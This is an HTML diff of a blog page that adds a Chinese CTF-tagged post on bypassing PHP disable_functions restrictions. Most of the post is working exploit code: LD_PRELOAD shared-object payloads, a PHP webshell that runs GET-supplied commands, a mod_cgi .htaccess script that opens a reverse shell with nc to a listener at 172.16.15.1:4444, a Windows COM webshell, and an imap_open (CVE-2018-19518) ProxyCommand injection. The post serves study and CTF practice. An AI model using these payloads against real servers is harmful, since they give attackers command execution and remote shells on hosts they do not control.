@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">0</span>
+            <span class="post-count">2.5k</span>
         </span>
     </span>
 
@@ -91,20 +91,94 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">11 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <h1 id="绕过DisFunc的常见小技巧"><a href="#绕过DisFunc的常见小技巧" class="headerlink" title="绕过DisFunc的常见小技巧"></a>绕过DisFunc的常见小技巧</h1><p>解析webshell命令不能执行时的三大情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一是 php.ini 中用 disable_functions 指示器禁用了 system()、exec() 等等这类命令执行的相关函数；</span><br><span class="line">二是 web 进程运行在 rbash 这类受限 shell 环境中</span><br><span class="line">三是 WAF 拦劫</span><br><span class="line">区别在于，1时什么命令都无法执行，2.3时部分命令可以执行</span><br></pre></td></tr></table></figure>
+
+<p>绕过disfunc的常用手法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；</span><br><span class="line">第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；</span><br><span class="line">第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；</span><br><span class="line">第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="一、LD-PRELOAD-amp-putenv"><a href="#一、LD-PRELOAD-amp-putenv" class="headerlink" title="一、LD_PRELOAD &amp; putenv()"></a>一、LD_PRELOAD &amp; putenv()</h2><h3 id="1-原理解析"><a href="#1-原理解析" class="headerlink" title="1.原理解析"></a>1.原理解析</h3><p>详细原理文章:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403%E9%A3%98%E9%9B%B6%E5%A4%A7%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0">https://www.anquanke.com/post/id/175403飘零大师傅的文章</a></p>
+<p>LD_PRELOAD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure>
+
+<p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
+<p>而putenv可以设置环境变量，两者搭配干活不累，注意这是<strong>暂时性的环境变量的设置，仅在会话期间起作用</strong></p>
+<p>首先这道题的大致原理就是，像<code>mail</code>这一类的函数在调用的时候，会调研系统的动态链接库，我们通过LD_PRELOAD进行环境变量的设置，将该函数本应该调用的动态链接库改成我们制作的恶意文件，从而达到进行执行我们想执行的函数的作用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，我想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，将突破 disable_functions 限制执行操作系统命令这一目标，大致分解成几步在本地推演：查看进程调用系统函数明细、操作系统环境下劫持系统函数注入代码、找寻内部启动新进程的 PHP 函数、PHP 环境下劫持系统函数注入代码。</span><br></pre></td></tr></table></figure>
+
+<p>这样我们呢就可以进行我们的骚操作了</p>
+<p><img src="https://i.loli.net/2020/10/13/lcypLN9eDZngFhk.png"></p>
+<p>这样我们进行对已有的常见的函数进行trace来看一下</p>
+<p><img src="https://i.loli.net/2020/10/13/kyY2Mr7jxhF4dX6.png"></p>
+<p>对于<code>/usr/sbin/sendmail</code>可以查到很多他调用的函数，比如其中的<code>getuid</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">运行 nm -D &#x2F;usr&#x2F;bin&#x2F;id 2&gt;&amp;1 或 readelf -Ws &#x2F;usr&#x2F;bin&#x2F;id 可查看该程序可能调用的系统 API 明细：</span><br><span class="line">man 2 getuid 查看函数原型</span><br><span class="line">印象中，处理图片、请求网页、发送邮件等三类场景中可能存在我想要的函数，我得逐一验证。</span><br><span class="line">处理图片，通常调用 PHP 封装的 ImageMagick 库，新建 image.php，调用 Imagick()</span><br><span class="line">请求网页，新建 http.php，调用 curl_init()：</span><br></pre></td></tr></table></figure>
+
+<p>然后写一个hack.so</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid() </span><br><span class="line">&#123;</span><br><span class="line">    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>
+
+<p>然后运行脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;);</span><br><span class="line">mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就可以看见</p>
+<p><img src="https://i.loli.net/2020/10/13/DWS412EPs8fRpxG.png"></p>
+<p>发现确实执行相关的命令，这是毫无悬念的。</p>
+<p>这样的话利用起来是不是就没有什么难度了，同样可以使用其他相同的函数进行操作。</p>
+<h3 id="改进版"><a href="#改进版" class="headerlink" title="改进版"></a>改进版</h3><p>GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void preloadme (void)</span><br><span class="line">&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so  &lt;/p&gt;&quot;</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">&quot; &gt; &quot;</span> . $out_path . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
+<p>根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&#39;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure>
+
+<p>意思就是这个函数会在evil shared library load上后，就会触发这个函数，反正就是特别早的触发。在实际利用中，注意找到那个<code>开启子进程</code>的大宝贝。</p>
+<h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h3><p>mail函数，error函数以及关键函数未被ban，都是通过send_mail命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;alex.so&quot;);</span><br><span class="line">error_log(&quot;alex&quot;,1,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、mod-cgi-模式"><a href="#二、mod-cgi-模式" class="headerlink" title="二、mod_cgi 模式"></a>二、mod_cgi 模式</h2><p>利用cgi程序可以执行命令这一点来执行系统命令,disable_functions也没办法.</p>
+<p>临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序,则可以在目的目录下使用htaccess文件进行配置,如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCgi</span><br><span class="line">AddHandler cgi-script *.dazzle</span><br></pre></td></tr></table></figure>
+
+<p>要求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apache且运行mod_cgi模式</span><br><span class="line">web目录可写</span><br><span class="line">允许.htaccess生效</span><br><span class="line">在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; &quot;nc -c &#39;&#x2F;bin&#x2F;bash&#39; 172.16.15.1 4444&quot;; &#x2F;&#x2F;command to be executed</span><br><span class="line">$shellfile &#x3D; &quot;#!&#x2F;bin&#x2F;bash\n&quot;; &#x2F;&#x2F;using a shellscript</span><br><span class="line">$shellfile .&#x3D; &quot;echo -ne \&quot;Content-Type: text&#x2F;html\\n\\n\&quot;\n&quot;; &#x2F;&#x2F;header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="line">$shellfile .&#x3D; &quot;$cmd&quot;; &#x2F;&#x2F;executing $cmd</span><br><span class="line">function checkEnabled($text,$condition,$yes,$no) &#x2F;&#x2F;this surely can be shorter</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#39;checked&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(&#39;.htaccess&#39;, &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); &#x2F;&#x2F;Append it to a .htaccess file to see whether .htaccess is allowed</span><br><span class="line">    header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;] . &#39;?checked&#x3D;true&#39;); &#x2F;&#x2F;execute the script again to see if the htaccess test worked</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $modcgi &#x3D; in_array(&#39;mod_cgi&#39;, apache_get_modules()); &#x2F;&#x2F; mod_cgi enabled?</span><br><span class="line">    $writable &#x3D; is_writable(&#39;.&#39;); &#x2F;&#x2F;current dir writable?</span><br><span class="line">    $htaccess &#x3D; !empty($_SERVER[&#39;HTACCESS&#39;]); &#x2F;&#x2F;htaccess enabled?</span><br><span class="line">        checkEnabled(&quot;Mod-Cgi enabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;Is writable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">        checkEnabled(&quot;htaccess working&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);</span><br><span class="line">    if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Error. All of the above must be true for the script to work!&quot;; &#x2F;&#x2F;abort if not</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        checkEnabled(&quot;Backing up .htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded! Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;make a backup, cause you never know.</span><br><span class="line">        checkEnabled(&quot;Write .htaccess file&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;.dizzle is a nice extension</span><br><span class="line">        checkEnabled(&quot;Write shell file&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;write the file</span><br><span class="line">        checkEnabled(&quot;Chmod 777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;); &#x2F;&#x2F;rwx</span><br><span class="line">        echo &quot;Executing the script now. Check your listener &lt;img src &#x3D; &#39;shell.dizzle&#39; style &#x3D; &#39;display:none;&#39;&gt;&quot;; &#x2F;&#x2F;call the script</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、系统组件绕过"><a href="#三、系统组件绕过" class="headerlink" title="三、系统组件绕过"></a>三、系统组件绕过</h2><p>Window com组件(php 5.4及以下默认开启)(高版本扩展要自己添加）<br>添加方法：<br>        在php相应版本下ext查找<code>php_com_dotnet.dll</code>,一般都会有。没有的话，下载添加到ext目录下。<br>查看php.ini中是否已经开启了com.allow_dcom = true</p>
+<p>然后在查找php.ini里面查找下extension=php_com_dotnet.dll把前面的#号或;号去掉。<br>如果没有找到，添加上extension=php_com_dotnet.dll即可。然后重启apache。然后查看phpinfo();</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c &quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、利用IMAP-OPEN-CVE-2018-19518"><a href="#四、利用IMAP-OPEN-CVE-2018-19518" class="headerlink" title="四、利用IMAP_OPEN(CVE-2018-19518)"></a>四、利用IMAP_OPEN(CVE-2018-19518)</h2><p>Php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）</p>
+<p>Ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。即使是ssh连接失败了，但是命令还是能执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$exp &#x3D; &quot;echo test!test! &gt; &#x2F;tmp&#x2F;test&quot;;</span><br><span class="line">$base64_exp &#x3D; base64_encode($exp);</span><br><span class="line">$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\t$&#123;base64_exp&#125;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">imap_open(&#39;&#123;&#39;.$server.&#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;) or die(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+ 
       <!-- reward -->
       
     </div>
@@ -171,6 +245,8 @@
 </div>
 
 <div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
     </footer>
   </div>
 
